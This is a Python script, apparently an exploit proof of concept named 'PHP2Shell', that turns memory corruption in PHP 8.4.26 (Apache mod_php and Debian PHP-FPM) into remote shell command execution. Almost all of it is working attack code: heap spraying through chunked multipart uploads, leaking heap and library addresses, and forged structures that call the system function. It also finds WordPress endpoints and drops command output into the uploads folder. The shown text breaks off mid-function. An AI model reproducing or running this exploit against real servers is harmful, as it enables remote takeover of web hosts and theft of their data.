#!/usr/bin/env python3
"""Standalone PHP2Shell proof for exact validated PHP 8.4.26 profiles.

This is deliberately not a universal PHP scanner. It contains separately
measured geometry and binary-relative offsets for:

* the pinned official Apache/mod_php production-style fixture; and
* the pinned Debian PHP-FPM application-time parsing fixture.

Auto mode probes the controlled FPM fixture first, then uses the Apache profile.
It does not establish an arbitrary target's binary identity. An independently
fetched command receipt is the strongest success check.
"""

from __future__ import annotations

import argparse
import collections
import json
import os
import secrets
import socket
import ssl
import struct
import sys
import time
import urllib.parse
from collections.abc import Iterable
from dataclasses import dataclass
from pathlib import Path


PROFILE = {
    "name": "php84-official-prod-v1",
    "php": "8.4.26",
    "libphp_sha256": "57dac347add8738e80393d81c70f5039c9534590f6e8c3ae0eaa258b9d18d6a8",
    "zval_ptr_dtor": 0x64EB60,
    "zif_system": 0x45A3B0,
    "stage3_pads": 67,
    "stage3_htdata": 0x6C0F8,
    "leak_read": 4_198_000,
}
FPM_PROFILE = {
    "name": "debian-php84.26-fpm-unserialize-v1",
    "php": "8.4.26",
    "php_fpm_sha256": "7b8de583561f37fde29b4b742a5704671a9927685739592fa5285fdee47ad232",
    "heap_leak_offset": 0x61F78,
    "code_pointer_source_offset": 0x56088,
    "object_carrier_offset": 0x64798,
    "zval_ptr_dtor": 0x418DB0,
    "zif_system": 0x240390,
    "producer_pad": 20_439_040,
}
PROFILES = {
    PROFILE["name"]: PROFILE,
    FPM_PROFILE["name"]: FPM_PROFILE,
}

TRANSPORT_SCHEME = "http"
TLS_INSECURE = False

ARM_BOUNDARY = b"PRODABOUNDARY"
B_BOUNDARY = b"PRODBBOUNDARY"
FOLLOW_BOUNDARY = b"BBBBBBBBBB"
SID = b"attacksessionid0001"


class PocError(RuntimeError):
    pass


def default_base_cache_path() -> Path:
    root = os.environ.get("XDG_CACHE_HOME")
    if not root:
        root = str(Path.home() / ".cache")
    return Path(root) / "php2shell-stx" / "apache-bases-v1.json"


def base_cache_key(
    scheme: str, host: str, port: int, endpoint: str, profile: str
) -> str:
    return f"{profile}|{scheme}://{host}:{port}{endpoint}"


def load_cached_bases(path: Path, key: str) -> tuple[int, int] | None:
    try:
        document = json.loads(path.read_text(encoding="utf-8"))
        entry = document["targets"][key]
        heap = int(entry["heap"], 16)
        libphp = int(entry["libphp"], 16)
    except (
        OSError,
        ValueError,
        KeyError,
        TypeError,
        AttributeError,
        json.JSONDecodeError,
    ):
        return None
    if document.get("version") != 1:
        return None
    if heap & 0x1FFFFF or libphp & 0xFFF:
        return None
    if not (0x700000000000 <= heap < 0x800000000000):
        return None
    if not (0x700000000000 <= libphp < 0x800000000000):
        return None
    return heap, libphp


def save_cached_bases(path: Path, key: str, heap: int, libphp: int) -> None:
    document: dict[str, object] = {"version": 1, "targets": {}}
    try:
        existing = json.loads(path.read_text(encoding="utf-8"))
        if existing.get("version") == 1 and isinstance(existing.get("targets"), dict):
            document = existing
    except (OSError, json.JSONDecodeError, AttributeError):
        pass
    targets = document["targets"]
    assert isinstance(targets, dict)
    targets[key] = {
        "heap": hex(heap),
        "libphp": hex(libphp),
        "saved_at": int(time.time()),
    }
    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    temporary = path.with_suffix(path.suffix + f".{os.getpid()}.tmp")
    temporary.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")
    temporary.chmod(0o600)
    temporary.replace(path)


def discard_cached_bases(path: Path, key: str) -> None:
    try:
        document = json.loads(path.read_text(encoding="utf-8"))
        targets = document.get("targets", {})
        if not isinstance(targets, dict) or key not in targets:
            return
        del targets[key]
        temporary = path.with_suffix(path.suffix + f".{os.getpid()}.tmp")
        temporary.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")
        temporary.chmod(0o600)
        temporary.replace(path)
    except (OSError, json.JSONDecodeError, AttributeError):
        return


def parse_url(url: str) -> tuple[str, str, int, str]:
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise PocError("target must be an http:// or https:// URL")
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    default_port = 443 if parsed.scheme == "https" else 80
    return parsed.scheme, parsed.hostname, parsed.port or default_port, path


def connect(host: str, port: int, timeout: float) -> socket.socket:
    raw = socket.create_connection((host, port), timeout=timeout)
    raw.settimeout(timeout)
    if TRANSPORT_SCHEME != "https":
        return raw
    if TLS_INSECURE:
        context = ssl._create_unverified_context()
    else:
        context = ssl.create_default_context()
    wrapped = context.wrap_socket(raw, server_hostname=host)
    wrapped.settimeout(timeout)
    return wrapped


def recv_all(sock: socket.socket, cap: int) -> bytes:
    data = bytearray()
    while len(data) < cap:
        try:
            block = sock.recv(min(65536, cap - len(data)))
        except (ConnectionResetError, socket.timeout):
            break
        if not block:
            break
        data += block
    return bytes(data)


def split_response(raw: bytes) -> tuple[bytes, list[bytes], bytes]:
    head, separator, body = raw.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n") if head else []
    status = lines[0] if lines else b""
    return status, lines[1:], body if separator else b""


def decoded_session_cookie(raw: bytes) -> bytes:
    _, headers, _ = split_response(raw)
    for line in headers:
        if not line.lower().startswith(b"set-cookie:"):
            continue
        for item in line.split(b":", 1)[1].split(b","):
            match = item.strip()
            if match.lower().startswith(b"phpsessid="):
                encoded = match.split(b"=", 1)[1].split(b";", 1)[0]
                return urllib.parse.unquote_to_bytes(encoded.decode("latin1"))
    return b""


def get(host: str, port: int, path: str, timeout: float, cap: int = 1 << 20):
    sock = connect(host, port, timeout)
    try:
        sock.sendall(
            f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            "Connection: close\r\n\r\n".encode()
        )
        raw = recv_all(sock, cap)
    finally:
        sock.close()
    status, _, body = split_response(raw)
    return status, body


def status_code(status: bytes) -> int:
    pieces = status.split()
    if len(pieces) >= 2 and pieces[1].isdigit():
        return int(pieces[1])
    return 0


def select_endpoint(host: str, port: int, supplied_path: str, timeout: float):
    clean_path = supplied_path.split("?", 1)[0]
    if clean_path.endswith(".php"):
        return supplied_path, "supplied-php"
    root = clean_path.rstrip("/")
    candidate = (root if root else "") + "/wp-content/index.php"
    status, body = get(host, port, candidate, timeout)
    if status_code(status) == 200 and len(body) <= 4096:
        return candidate, "wordpress-quiet-route"
    fallback = (root if root else "") + "/index.php"
    status, _ = get(host, port, fallback, timeout)
    if status_code(status) == 200:
        return fallback, "index-php"
    raise PocError("could not identify a quiet PHP endpoint")


def multipart_part(boundary: bytes, name: bytes, value: bytes) -> bytes:
    return (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        + value + b"\r\n"
    )


def file_part(boundary: bytes, field_len: int, filename_len: int) -> bytes:
    return (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="' + b"F" * field_len
        + b'"; filename="' + b"A" * filename_len + b'"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
        + b"A" * 64 + b"\r\n"
    )


def send_chunk(sock: socket.socket, data: bytes) -> None:
    sock.sendall(f"{len(data):x}\r\n".encode() + data + b"\r\n")


def open_chunked(host: str, port: int, path: str, boundary: bytes, timeout: float):
    sock = connect(host, port, timeout)
    sock.sendall(
        (
            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
        ).encode()
    )
    return sock


def finish_chunked(sock: socket.socket, boundary: bytes) -> None:
    send_chunk(sock, b"--" + boundary + b"--\r\n")
    sock.sendall(b"0\r\n\r\n")


def stage1_arm(host: str, port: int, path: str, timeout: float) -> bytes:
    sock = open_chunked(host, port, path, ARM_BOUNDARY, timeout)
    try:
        for index in range(63):
            name = (f"g{index:04d}" + "x" * 103)[:103].encode()
            send_chunk(sock, multipart_part(ARM_BOUNDARY, name, b"v" * 8))
        for index in range(820):
            send_chunk(
                sock,
                multipart_part(ARM_BOUNDARY, str(1000 + index).encode(), b"B" * 75000),
            )
        for index in range(40):
            send_chunk(
                sock,
                multipart_part(ARM_BOUNDARY, str(200000 + index).encode(), b"T" * 69000),
            )
        for index in range(22):
            send_chunk(
                sock,
                multipart_part(ARM_BOUNDARY, str(300000 + index).encode(), b"U" * 3000),
            )
        for index, length in enumerate((160, 192, 400, 460, 800)):
            send_chunk(
                sock,
                multipart_part(ARM_BOUNDARY, str(500000 + index).encode(), b"Y" * length),
            )
        send_chunk(sock, multipart_part(ARM_BOUNDARY, b"PHPSESSID", b"\x00"))
        send_chunk(
            sock,
            multipart_part(ARM_BOUNDARY, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        )
        send_chunk(sock, file_part(ARM_BOUNDARY, 103, 104))
        finish_chunked(sock, ARM_BOUNDARY)
        return recv_all(sock, 2 << 20)
    finally:
        sock.close()


def forge_leak_value() -> bytes:
    header_offset = 2 * 4096
    data_offset = header_offset + 24
    value = bytearray(b"Q" * (data_offset + 1000))
    struct.pack_into("<Q", value, header_offset, 0x4141414141414141)
    struct.pack_into("<Q", value, header_offset + 8, 0)
    struct.pack_into("<Q", value, header_offset + 16, PROFILE["leak_read"])
    value[data_offset:] = b"M" * 1000
    return bytes(value)


def stage2_follow(host: str, port: int, path: str, timeout: float) -> bytes:
    sock = open_chunked(host, port, path, B_BOUNDARY, timeout)
    try:
        for index in range(32):
            send_chunk(
                sock,
                multipart_part(B_BOUNDARY, str(1000 + index).encode(), b"V" * 231),
            )
        for index in range(400):
            send_chunk(
                sock,
                multipart_part(B_BOUNDARY, str(5000 + index).encode(), b"B" * 75000),
            )
        for index in range(504):
            send_chunk(
                sock,
                multipart_part(B_BOUNDARY, str(6000 + index).encode(), b"T" * 4000),
            )
        send_chunk(sock, multipart_part(B_BOUNDARY, b"900000", forge_leak_value()))
        send_chunk(sock, multipart_part(B_BOUNDARY, b"PHPSESSID", SID))
        send_chunk(
            sock,
            multipart_part(B_BOUNDARY, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        )
        finish_chunked(sock, B_BOUNDARY)
        return recv_all(sock, 16 << 20)
    finally:
        sock.close()


def select_module_candidate(
    candidates: list[tuple[int, int, int]],
) -> tuple[int, int, int]:
    candidates.sort(reverse=True)
    if not candidates:
        raise PocError("disclosure contained no repeated module candidate")
    if len(candidates) > 1:
        winner = candidates[0][0]
        runner_up = candidates[1][0]
        if winner < runner_up * 2 or winner - runner_up < 4:
            rendered = [
                (count, hex(pointer), hex(base))
                for count, pointer, base in candidates
            ]
            raise PocError(f"module candidate selection is ambiguous: {rendered}")
    return candidates[0]


def derive_bases(leak: bytes) -> tuple[int, int, int, int]:
    pointer_items = []
    for offset in range(0, len(leak) - 7, 8):
        value = struct.unpack_from("<Q", leak, offset)[0]
        if 0x700000000000 <= value < 0x800000000000:
            pointer_items.append(value)
    if not pointer_items:
        raise PocError("disclosure contained no canonical pointers")

    heap_bases = collections.Counter(value & ~0x1FFFFF for value in pointer_items)
    heap, heap_count = heap_bases.most_common(1)[0]
    if heap_count < 100:
        raise PocError(f"heap candidate confidence too low ({heap_count} pointers)")

    values = collections.Counter(pointer_items)
    candidates = []
    for pointer, count in values.items():
        base = pointer - PROFILE["zval_ptr_dtor"]
        if count >= 4 and base > 0 and base & 0xFFF == 0:
            candidates.append((count, pointer, base))
    dtor_count, dtor, libphp = select_module_candidate(candidates)
    return heap, heap_count, libphp, dtor_count


def stage3_arm(host: str, port: int, path: str, timeout: float) -> bytes:
    sock = open_chunked(host, port, path, ARM_BOUNDARY, timeout)
    try:
        send_chunk(sock, multipart_part(ARM_BOUNDARY, b"PHPSESSID", b"a" * 19))
        send_chunk(
            sock,
            multipart_part(ARM_BOUNDARY, b"PHP_SESSION_UPLOAD_PROGRESS", b"p" * 3),
        )
        for index in range(PROFILE["stage3_pads"]):
            name_length = 8 if index == 0 else 7
            name = f"p{index:0{name_length - 1}d}"[:name_length].encode()
            send_chunk(sock, multipart_part(ARM_BOUNDARY, name, b"V" * 7))
        send_chunk(sock, file_part(ARM_BOUNDARY, 1, len(b"a.txt")))
        send_chunk(
            sock,
            b"--" + ARM_BOUNDARY
            + b'\r\nContent-Disposition: form-data; name="big"\r\n\r\n',
        )
        block = b"B" * (256 << 10)
        for _ in range(129 * 4):
            send_chunk(sock, block)
        send_chunk(sock, b"\r\n--" + ARM_BOUNDARY + b"--\r\n")
        sock.sendall(b"0\r\n\r\n")
        return recv_all(sock, 2 << 20)
    finally:
        sock.close()


def fake_structures(command: bytes, heap: int, libphp: int) -> tuple[bytes, bytes]:
    ht = bytearray(max(167, 0x98 + len(command) + 1))
    reference = bytearray(b"X" * 55)
    data = heap + PROFILE["stage3_htdata"]
    zif = libphp + PROFILE["zif_system"]
    struct.pack_into(
        "<IIIIQIIIIQQ", ht, 0,
        1, 7, 0x10, 0xFFFFFFF8, data + 0x20,
        1, 1, 8, 0, 0, zif,
    )
    bucket = 0x20
    struct.pack_into(
        "<QQQQQIIQQI", ht, bucket,
        0, 0, zif, 0, 0, 0, 1, 0, 0, 0,
    )
    struct.pack_into("<Q", ht, bucket + 0x50, data + 0x80)
    struct.pack_into("<I", ht, bucket + 0x58, 6)
    struct.pack_into("<IIQQQ", ht, 0x80, 1, 0x106, 0, len(command), 0)
    ht[0x98:0x98 + len(command)] = command
    ht[0x98 + len(command)] = 0
    struct.pack_into("<IIQQQ", reference, 0x10, 1, 10, data, 0x307, 0)
    return bytes(ht), bytes(reference[8:] + b"X" * 8)


def build_follow_body(command: str, heap: int, libphp: int) -> bytes:
    encoded = command.encode()
    if len(encoded) > 32:
        raise PocError("this calibrated profile accepts commands of at most 32 bytes")
    carrier = encoded.ljust(32) + b";echo Q"
    ht, reference = fake_structures(carrier, heap, libphp)
    parts = [
        multipart_part(FOLLOW_BOUNDARY, b"PHPSESSID", SID),
        multipart_part(FOLLOW_BOUNDARY, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
    ]
    for index in range(15):
        name = f"a{index:030d}"[:31].encode()
        parts.append(multipart_part(FOLLOW_BOUNDARY, name, ht))
    for index in range(950):
        parts.append(multipart_part(FOLLOW_BOUNDARY, f"f{index:02d}".encode(), reference))
    parts.append(b"--" + FOLLOW_BOUNDARY + b"--\r\n")
    return b"".join(parts)


def stage3_follow(host: str, port: int, path: str, body: bytes, timeout: float) -> bytes:
    sock = connect(host, port, timeout)
    try:
        sock.sendall(
            (
                f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                f"Content-Type: multipart/form-data; boundary={FOLLOW_BOUNDARY.decode()}\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode()
            + body
        )
        return recv_all(sock, 2 << 20)
    finally:
        sock.close()


def inline_receipt(raw: bytes) -> tuple[bool, str]:
    _, _, body = split_response(raw)
    marker = b"\nQ\n"
    if marker in body:
        before = body.rsplit(marker, 1)[0].rstrip(b"\r\n").splitlines()
        return True, before[-1].decode("latin1", "replace") if before else ""
    if body.endswith((b"Q\n", b"Q\r\n")):
        return True, ""
    return False, ""


def verification_plan(endpoint: str) -> tuple[str, str]:
    token = "s" + secrets.token_hex(3)
    clean = endpoint.split("?", 1)[0]
    if clean.endswith("/wp-content/index.php"):
        command = f"id>wp-content/uploads/{token}"
        receipt = clean.rsplit("/", 1)[0] + f"/uploads/{token}"
    else:
        command = f"id>/var/www/html/{token}"
        receipt = "/" + token
    if len(command.encode()) > 32:
        raise PocError("generated verification command exceeds the calibrated carrier")
    return command, receipt


def command_receipt_plan(endpoint: str, command: str) -> tuple[str, str] | None:
    """Capture short command output through the ordinary writable WP uploads path."""
    clean = endpoint.split("?", 1)[0]
    if not clean.endswith("/wp-content/index.php"):
        return None
    prefix = f"({command})>wp-content/uploads/"
    available = 32 - len(prefix.encode())
    if available < 2:
        return None
    token = secrets.token_hex(min(4, available // 2))
    receipt = clean.rsplit("/", 1)[0] + f"/uploads/{token}"
    wrapped = prefix + token
    if len(wrapped.encode()) > 32:
        return None
    return wrapped, receipt


def run_apache_stage3(
    host: str,
    port: int,
    endpoint: str,
    timeout: float,
    follow_attempts: int,
    command: str,
    heap: int,
    libphp: int,
    receipt_path: str | None,
    receipt_marker: bytes | None,
    *,
    source: str,
) -> bool:
    print(
        f"[*] stage3 bases={source} heap={heap:#x} libphp={libphp:#x}",
        flush=True,
    )
    follow_body = build_follow_body(command, heap, libphp)
    arm_response = stage3_arm(host, port, endpoint, timeout)
    arm_status, _, _ = split_response(arm_response)
    print(f"[*] stage3 arm status={status_code(arm_status)}", flush=True)
    if status_code(arm_status) != 500:
        return False

    for attempt in range(1, follow_attempts + 1):
        response = stage3_follow(host, port, endpoint, follow_body, timeout)
        status, _, body = split_response(response)
        observed, output = inline_receipt(response)
        print(
            f"[*] stage3 follow={attempt} status={status_code(status)} "
            f"body={len(body)} inline_receipt={int(observed)}",
            flush=True,
        )
        if observed:
            print(f"[+] COMMAND_OUTPUT: {output}")
            return True
        if receipt_path is not None and status_code(status) == 0:
            for _ in range(3):
                receipt_status, receipt_body = get(host, port, receipt_path, timeout)
                if status_code(receipt_status) == 200 and (
                    receipt_marker is None or receipt_marker in receipt_body
                ):
                    text = receipt_body.decode("latin1", "replace").strip()
                    print(f"[+] HTTP_RECEIPT path={receipt_path} status=200")
                    print(f"[+] COMMAND_OUTPUT: {text}")
                    return True
                time.sleep(0.05)
            return False

    if receipt_path is not None:
        receipt_status, receipt_body = get(host, port, receipt_path, timeout)
        if status_code(receipt_status) == 200 and (
            receipt_marker is None or receipt_marker in receipt_body
        ):
            text = receipt_body.decode("latin1", "replace").strip()
            print(f"[+] HTTP_RECEIPT path={receipt_path} status=200")
            print(f"[+] COMMAND_OUTPUT: {text}")
            return True
    return False


# Exact Debian PHP-FPM application-time parsing profile. These helpers are
# intentionally separate from the Apache geometry above.
FPM_BOUNDARY = b"FpmUnserializeBoundary"


@dataclass
class FpmResponse:
    status: int
    reason: str
    headers: dict[str, str]
    body: bytes
    raw_size: int


def fpm_part_header(
    boundary: bytes, name: bytes, filename: bytes | None = None
) -> bytes:
    value = bytearray(
        b"--" + boundary + b'\r\nContent-Disposition: form-data; name="'
    )
    value += name + b'"'
    if filename is not None:
        value += b'; filename="' + filename + b'"'
    value += b"\r\n"
    if filename is not None:
        value += b"Content-Type: application/octet-stream\r\n"
    value += b"\r\n"
    return bytes(value)


def fpm_literal_part(boundary: bytes, name: bytes, value: bytes) -> list[object]:
    return [fpm_part_header(boundary, name), value, b"\r\n"]


def fpm_repeated_part(
    boundary: bytes, name: bytes, byte: bytes, length: int
) -> list[object]:
    return [fpm_part_header(boundary, name), (byte, length), b"\r\n"]


def fpm_file_part(
    boundary: bytes,
    name_byte: bytes,
    name_length: int,
    filename_byte: bytes,
    filename_length: int,
) -> list[object]:
    return [
        fpm_part_header(
            boundary,
            name_byte * name_length,
            filename_byte * filename_length,
        ),
        b"Z\r\n",
    ]


def fpm_item_length(item: object) -> int:
    if isinstance(item, bytes):
        return len(item)
    _, length = item  # type: ignore[misc]
    return int(length)


def fpm_iter_item(item: object) -> Iterable[bytes]:
    if isinstance(item, bytes):
        yield item
        return
    byte, length = item  # type: ignore[misc]
    block = byte * min(65_536, max(1, int(length)))
    remaining = int(length)
    while remaining:
        take = min(remaining, len(block))
        yield block[:take]
        remaining -= take


def fpm_decode_chunked(data: bytes) -> bytes:
    output = bytearray()
    cursor = 0
    while True:
        end = data.find(b"\r\n", cursor)
        if end < 0:
            return data
        size_text = data[cursor:end].split(b";", 1)[0]
        try:
            size = int(size_text, 16)
        except ValueError:
            return data
        cursor = end + 2
        if size == 0:
            return bytes(output)
        if cursor + size > len(data):
            return data
        output += data[cursor:cursor + size]
        cursor += size + 2


def fpm_root_path(supplied_path: str) -> str:
    clean = supplied_path.split("?", 1)[0]
    if clean.endswith(".php"):
        clean = clean.rsplit("/", 1)[0]
    return clean.rstrip("/")


class FpmClient:
    def __init__(self, host: str, port: int, base_path: str, timeout: float):
        self.host = host
        self.port = port
        self.base_path = base_path.rstrip("/")
        self.timeout = timeout

    def path(self, suffix: str) -> str:
        return (self.base_path + "/" + suffix.lstrip("/")) or "/"

    def url(self, suffix: str) -> str:
        return (
            f"{TRANSPORT_SCHEME}://{self.host}:{self.port}"
            f"{self.path(suffix)}"
        )

    def request(
        self,
        method: str,
        suffix: str,
        *,
        sid: str | None = None,
        content_type: str | None = None,
        items: list[object] | None = None,
    ) -> FpmResponse:
        body_items = items or []
        total = sum(fpm_item_length(item) for item in body_items)
        headers = [
            f"{method} {self.path(suffix)} HTTP/1.1",
            f"Host: {self.host}:{self.port}",
            "Connection: close",
        ]
        if sid:
            headers.append(f"Cookie: PHPSESSID={sid}")
        if content_type:
            headers.append(f"Content-Type: {content_type}")
        if items is not None:
            headers.append(f"Content-Length: {total}")
        wire_head = ("\r\n".join(headers) + "\r\n\r\n").encode()
        response = bytearray()
        sock = connect(self.host, self.port, self.timeout)
        try:
            sock.sendall(wire_head)
            for item in body_items:
                for chunk in fpm_iter_item(item):
                    sock.sendall(chunk)
            try:
                while True:
                    chunk = sock.recv(65_536)
                    if not chunk:
                        break
                    response += chunk
            except (ConnectionResetError, socket.timeout):
                pass
        finally:
            sock.close()

        raw = bytes(response)
        header_blob, separator, body = raw.partition(b"\r\n\r\n")
        if not separator:
            return FpmResponse(0, "NO_HTTP_RESPONSE", {}, b"", len(raw))
        lines = header_blob.split(b"\r\n")
        status = 0
        reason = ""
        try:
            first = lines[0].decode("latin1").split(" ", 2)
            status = int(first[1])
            reason = first[2] if len(first) > 2 else ""
        except (IndexError, ValueError):
            pass
        parsed_headers: dict[str, str] = {}
        for line in lines[1:]:
            key, separator, value = line.partition(b":")
            if separator:
                parsed_headers[key.decode("latin1").lower()] = (
                    value.strip().decode("latin1")
                )
        if parsed_headers.get("transfer-encoding", "").lower() == "chunked":
            body = fpm_decode_chunked(body)
        return FpmResponse(status, reason, parsed_headers, body, len(raw))

    def get(self, suffix: str, sid: str | None = None) -> FpmResponse:
        return self.request("GET", suffix, sid=sid)


def fpm_fixture_available(client: FpmClient) -> tuple[bool, str]:
    checks = (
        "/fpm-session-receipt.php?sid=invalid",
        "/fpm-reference-delayed-seed.php?sid=invalid",
        "/fpm-reference-array-seed.php?sid=invalid",
        "/fpm-object-progress-key-seed.php?sid=invalid",
    )
    for path in checks:
        try:
            response = client.get(path)
        except OSError as exc:
            return False, f"transport-error:{exc}"
        if response.status != 400 or b"INVALID_SID" not in response.body:
            return False, f"missing-signature:{path}:http-{response.status}"
    return True, "validated-fixture-endpoints"


def fpm_require_status(
    response: FpmResponse, expected: set[int], label: str
) -> None:
    if response.status not in expected:
        raise PocError(f"{label}: HTTP {response.status} {response.reason}")


def fpm_standard_arm(client: FpmClient, sid: str) -> FpmResponse:
    items: list[object] = []
    items += fpm_literal_part(
        FPM_BOUNDARY, b"PHP_SESSION_UPLOAD_PROGRESS", b"K" * 1_048_576
    )
    items += fpm_file_part(FPM_BOUNDARY, b"N", 5_242_880, b"F", 5_242_880)
    items += fpm_repeated_part(FPM_BOUNDARY, b"oom", b"O", 47_185_920)
    items += [b"--" + FPM_BOUNDARY + b"--\r\n"]
    return client.request(
        "POST",
        "/index.php",
        sid=sid,
        content_type=f"multipart/form-data; boundary={FPM_BOUNDARY.decode()}",
        items=items,
    )


def fpm_application_oom(client: FpmClient, sid: str) -> FpmResponse:
    items: list[object] = []
    items += fpm_repeated_part(
        FPM_BOUNDARY, b"pad", b"P", FPM_PROFILE["producer_pad"]
    )
    items += fpm_literal_part(
        FPM_BOUNDARY, b"PHP_SESSION_UPLOAD_PROGRESS", b"producer"
    )
    items += [fpm_part_header(FPM_BOUNDARY, b"f", b"a"), b"Z\r\n"]
    items += [b"--" + FPM_BOUNDARY + b"--\r\n"]
    return client.request(
        "PUT",
        "/fpm-unserialize-buffer-producer.php?pad=0",
        sid=sid,
        content_type=f"multipart/form-data; boundary={FPM_BOUNDARY.decode()}",
        items=items,
    )


def fpm_intleak_consumer(client: FpmClient, sid: str) -> FpmResponse:
    boundary = b"FpmUnserializeIntLeak"
    items: list[object] = []
    items += fpm_literal_part(
        boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"consumer"
    )
    items += [fpm_part_header(boundary, b"f", b"a"), b"Z\r\n"]
    items += [b"--" + boundary + b"--\r\n"]
    return client.request(
        "POST",
        "/fpm-session-inspect-consumer.php",
        sid=sid,
        content_type=f"multipart/form-data; boundary={boundary.decode()}",
        items=items,
    )


def fpm_fake_object(command: bytes, data: int, zif_system: int) -> bytes:
    if len(command) > 71:
        raise PocError(
            f"final FPM command is {len(command)} bytes; object carrier limit is 71"
        )
    blob = bytearray(288)
    struct.pack_into("<II", blob, 0x00, 0, 8)
    struct.pack_into("<II", blob, 0x08, 0, 0)
    struct.pack_into("<Q", blob, 0x10, 0)
    struct.pack_into("<Q", blob, 0x18, data + 0x70)
    struct.pack_into("<Q", blob, 0x20, 0)
    struct.pack_into("<II", blob, 0x28, 0, 1)
    struct.pack_into("<Q", blob, 0x50, data + 0xC0)
    struct.pack_into("<I", blob, 0x58, 6)
    struct.pack_into("<iIQQ", blob, 0x70, 0, 0, 0, zif_system)
    struct.pack_into("<IIQQQ", blob, 0xC0, 1, 0x106, 0, len(command), 0)
    blob[0xD8:0xD8 + len(command)] = command
    blob[0xD8 + len(command)] = 0
    return bytes(blob)


def fpm_pointer_forge(
    client: FpmClient,
    sid: str,
    pointer: int,
    type_info: int,
    *,
    command: bytes | None = None,
    code_base: int | None = None,
) -> FpmResponse:
    pointer_bytes = struct.pack("<Q", pointer)
    if pointer_bytes[6:] != b"\x00\x00":
        raise PocError("derived FPM pointer is not a canonical low-half address")
    pointer_low = pointer_bytes[:6]
    for forbidden in (b"\x00", b"\r", b"\n", b'"', b"\\", b";"):
        if forbidden in pointer_low:
            raise PocError(
                f"derived FPM pointer contains forbidden multipart byte {forbidden!r}"
            )
    if not 0 < type_info < 65_536:
        raise PocError("FPM type_info must fit two bytes")
    type_bytes = struct.pack("<H", type_info).rstrip(b"\x00")
    if b"\x00" in type_bytes:
        raise PocError("FPM type_info contains an embedded NUL")

    sprays: list[bytes]
    if command is None:
        sprays = []
    else:
        if code_base is None or type_info != 0x308:
            raise PocError("FPM object execution requires a code base and type 0x308")
        sprays = [
            fpm_fake_object(
                command,
                pointer,
                code_base + FPM_PROFILE["zif_system"],
            )
        ]

    boundary = b"FpmUnserializeForge"
    items: list[object] = []
    items += fpm_literal_part(
        boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"consumer"
    )
    for index in range(4):
        items += fpm_literal_part(boundary, f"q{index}".encode(), b"V")
    for index, spray in enumerate(sprays):
        spray_name = f"a{index:030d}"[:31].encode()
        items += fpm_literal_part(boundary, spray_name, spray)
    items += fpm_literal_part(boundary, b"7", b"W")

    prime = b"A" * 8 + type_bytes
    prime_padding = b" " * (27 - len(prime))
    pointer_padding = b" " * 17
    items += [
        b"--" + boundary + b"\r\n"
        b"Content-Disposition: form-data; name=\"" + prime + b"\""
        + prime_padding + b"; name=\"" + pointer_low + b"\""
        + pointer_padding + b"; filename=\"\"\r\n"
        b"Content-Type: application/octet-stream\r\n\r\n"
        b"Z\r\n"
        b"--" + boundary + b"--\r\n"
    ]
    return client.request(
        "POST",
        "/fpm-session-inspect-consumer.php",
        sid=sid,
        content_type=f"multipart/form-data; boundary={boundary.decode()}",
        items=items,
    )


def fpm_parse_receipt(response: FpmResponse) -> dict[str, str]:
    fpm_require_status(response, {200}, "FPM session receipt")
    values: dict[str, str] = {}
    for line in response.body.decode("latin1", "replace").splitlines():
        key, separator, value = line.partition("=")
        if separator:
            values[key] = value
    return values


def fpm_sid(label: str) -> str:
    return (label + secrets.token_hex(10))[:40]


def fpm_leak_heap(client: FpmClient, attempts: int) -> tuple[int, int]:
    for attempt in range(attempts):
        consumer_sid = fpm_sid(f"hc{attempt}")
        producer_sid = fpm_sid(f"hp{attempt}")
        fpm_require_status(
            client.get(
                f"/fpm-reference-delayed-seed.php?sid={consumer_sid}"
                f"&pre=2&delay={attempt}"
            ),
            {200},
            "FPM heap consumer seed",
        )
        fpm_require_status(
            client.get(
                f"/fpm-int-before-blob-seed.php?sid={producer_sid}&mib=11"
            ),
            {200},
            "FPM heap producer seed",
        )
        fpm_require_status(
            fpm_application_oom(client, producer_sid),
            {200},
            "FPM heap producer OOM",
        )
        follow = fpm_intleak_consumer(client, consumer_sid)
        receipt = fpm_parse_receipt(
            client.get(f"/fpm-session-receipt.php?sid={consumer_sid}")
        )
        leak_text = receipt.get("heap_hex", "")
        print(
            f"[*] fpm heap attempt={attempt + 1}/{attempts} "
            f"follow={follow.status} receipt={leak_text or 'none'}",
            flush=True,
        )
        if follow.status != 200 or not leak_text.startswith("0x"):
            continue
        leak = int(leak_text, 16)
        heap_base = leak & ~0x1FFFFF
        if leak - heap_base != FPM_PROFILE["heap_leak_offset"]:
            raise PocError(
                f"FPM heap receipt offset 0x{leak - heap_base:x} "
                "does not match the exact profile"
            )
        return leak, heap_base
    raise PocError("no surviving FPM heap disclosure within the attempt bound")


def fpm_leak_code(client: FpmClient, heap_base: int) -> tuple[int, int]:
    consumer_sid = fpm_sid("cc")
    producer_sid = fpm_sid("cp")
    fpm_require_status(
        client.get(f"/fpm-reference-array-seed.php?sid={consumer_sid}"),
        {200},
        "FPM code consumer seed",
    )
    fpm_require_status(
        fpm_standard_arm(client, producer_sid), {200}, "FPM code standard arm"
    )
    fpm_require_status(
        fpm_application_oom(client, producer_sid),
        {200},
        "FPM code producer OOM",
    )
    source = heap_base + FPM_PROFILE["code_pointer_source_offset"]
    follow = fpm_pointer_forge(client, consumer_sid, source, 6)
